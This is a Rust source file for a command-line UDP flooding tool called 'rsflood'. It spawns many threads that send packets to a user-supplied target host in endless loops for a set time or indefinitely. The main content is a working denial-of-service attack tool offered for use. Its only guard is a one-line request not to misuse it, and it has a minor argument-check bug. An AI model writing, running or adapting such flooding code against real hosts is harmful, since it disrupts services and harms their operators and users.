use std::io::{Write};
use std::net::{TcpStream, TcpListener, UdpSocket};
use std::env;
use std::thread;
use std::process::exit;
use std::time;

fn new_socket(host: &str, port: u32) -> UdpSocket{
	let socket = UdpSocket::bind(format!("0.0.0.0:{}", port)).unwrap();
	
	println!("{}",host);
    socket.connect(host).unwrap();
	return socket;
}

fn log(msg: &str){	
    println!("[rsflood] {}", msg);
}

fn main() {
    let args: Vec<_> = env::args().collect();
    log("rslflood - Made by Celesian");
    log("don't use this tool on any not allowed applications, please.");
    if args.len() > 2{
        log(&*format!("Starting attack against {}...", args[1]));
        let num_threads = args[2].to_string().parse::<i32>().unwrap();
        let time = args[3].to_string().parse::<u64>().unwrap();
        let host = args[1].to_string();
		let mut port : u32 = 40000;
        for _ in 1..num_threads {
			port = port.clone() +  1;
            let host = format!("{}:{}", host.clone(), port);
            thread::spawn(move || {
				println!("{}", port);

				let socket = new_socket(host.as_str(), port);
                loop{
					let msg = "Que Ota?";
 					socket.send(msg.as_bytes()).unwrap();
                }	

            });

        }

		println!("All threads were created.");
		if (time == 0){
			loop{}
		}
		else{
			thread::sleep(time::Duration::new(time, 0));
			exit(0);
		}
	}
    else{
        log(&*format!("{} ip:port number_of_threads time(0 for infinite)", args[0]))
    }
}	
